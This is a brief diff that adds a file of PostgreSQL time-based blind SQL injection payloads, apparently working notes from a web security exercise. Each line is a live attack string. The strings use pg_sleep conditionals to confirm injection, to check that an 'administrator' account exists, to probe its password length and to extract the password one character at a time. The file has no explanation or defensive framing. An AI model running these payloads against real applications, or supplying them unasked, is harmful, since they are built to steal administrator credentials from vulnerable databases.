@@ -1,0 +1,11 @@
+' || (Select case when (1=1) then pg_sleep(10)else pg_sleep(-1)end)--
+
+' || (Select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1)end from users)--
+
+' || (Select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1)end from users)--
+
+
+' || (Select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1)end from users)--
+
+
+
